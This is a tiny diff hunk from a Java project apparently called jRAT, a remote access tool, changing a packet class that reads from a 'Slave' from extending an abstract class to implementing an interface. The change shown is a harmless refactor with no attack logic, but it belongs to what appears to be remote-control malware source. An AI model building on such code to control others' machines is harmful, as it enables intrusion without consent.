@@ -3,7 +3,7 @@ package jrat.controller.packets.incoming;
 import jrat.controller.Slave;
 
 
-public class Packet15InitJavaPath extends AbstractIncomingPacket {
+public class Packet15InitJavaPath implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
